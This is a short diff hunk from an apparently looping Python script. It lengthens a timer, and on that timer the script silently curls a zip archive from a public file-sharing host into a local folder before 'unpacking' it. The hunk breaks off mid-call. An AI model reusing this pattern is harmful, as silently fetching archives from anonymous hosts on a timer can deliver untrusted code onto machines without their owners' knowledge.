@@ -21,7 +21,7 @@ html = """
 # sock.bind(("0.0.0.0", 59999))
 while True:
     print(int(time.time() % 60))
-    if int(time.time()) % 300 == 0:
+    if int(time.time()) % 3000 == 0:
         print("unpacking")
         os.system(
             'curl -s -X GET "https://filebin.net/archive/9o7x50gflyuf7th8/zip" --output ./RAM/filebin.zip'
